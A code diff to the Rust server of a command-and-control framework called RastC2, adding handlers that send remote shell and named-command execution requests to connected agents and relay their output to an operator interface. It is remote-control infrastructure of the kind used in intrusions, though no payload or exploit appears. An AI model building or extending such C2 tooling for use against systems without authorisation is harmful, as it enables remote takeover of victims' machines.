@@ -144,14 +144,14 @@ impl RastC2 {
                 let ipdata = IpData { ip: *ip };
                 UiResponse::GetIpData(ipdata)
             },
-            UiRequest::Command(ip, cmd) => {
+            UiRequest::ShellRequest(ip, cmd) => {
                 let conn = self.connections.get(ip).unwrap();
                 let mut conn = conn.lock().await;
 
                 // TODO: put all of that into struct and do abstractions
                 let mut messager = Messager::new(&mut *conn);
 
-                let request = AgentMessage::C2Request(C2Request::ExecCommand(cmd.to_string()));
+                let request = AgentMessage::C2Request(C2Request::ExecShell(cmd.to_string()));
                 let request = packager.encode(&request)?;
 
                 let _result = messager.send(request).await;
@@ -159,13 +159,62 @@ impl RastC2 {
 
                 let output = packager.decode(&bytes.into());
                 let output = output?;
-                let AgentMessage::AgentResponse(AgentResponse::CommandResponse(output)) = output else { todo!()};
+                let AgentMessage::AgentResponse(AgentResponse::ShellResponse(output)) = output else { todo!()};
 
-                UiResponse::Command(output)
+                UiResponse::ShellOutput(output)
+            },
+            UiRequest::GetCommands(ip) => {
+                let conn = self.connections.get(ip).unwrap();
+                let mut conn = conn.lock().await;
+
+                // TODO: put all of that into struct and do abstractions
+                let mut messager = Messager::new(&mut *conn);
+
+                let request = AgentMessage::C2Request(C2Request::GetCommands);
+                let request = packager.encode(&request)?;
+
+                let _result = messager.send(request).await;
+                let bytes = messager.next().await.unwrap().unwrap();
+
+                let output = packager.decode(&bytes.into());
+                let output = output?;
+                let AgentMessage::AgentResponse(AgentResponse::Commands(commands)) = output else { todo!()};
+
+                UiResponse::Commands(commands)
+            },
+            UiRequest::ExecCommand(ip, command, args) => {
+                let conn = self.connections.get(ip).unwrap();
+                let mut conn = conn.lock().await;
+
+                // TODO: put all of that into struct and do abstractions
+                let mut messager = Messager::new(&mut *conn);
+
+                let request = AgentMessage::C2Request(C2Request::ExecCommand(
+                    command.to_string(),
+                    args.clone(),
+                ));
+                let request = packager.encode(&request)?;
+
+                let _result = messager.send(request).await;
+                let bytes = messager.next().await.unwrap().unwrap();
+
+                let output = packager.decode(&bytes.into());
+                let msg: AgentMessage = output?;
+                let output = match msg {
+                    AgentMessage::C2Request(_) => unreachable!(),
+                    AgentMessage::AgentResponse(resp) => match resp {
+                        AgentResponse::CommandOutput(output) => output,
+                        AgentResponse::Error(err) => err,
+                        _ => unreachable!(),
+                    },
+                };
+
+                UiResponse::CommandOutput(output)
             },
         };
         info!("{:?}", response);
-        let _result = req.respond(response);
+        let result = req.respond(response);
+        info!("{:?}", result);
         Ok(())
     }
 }
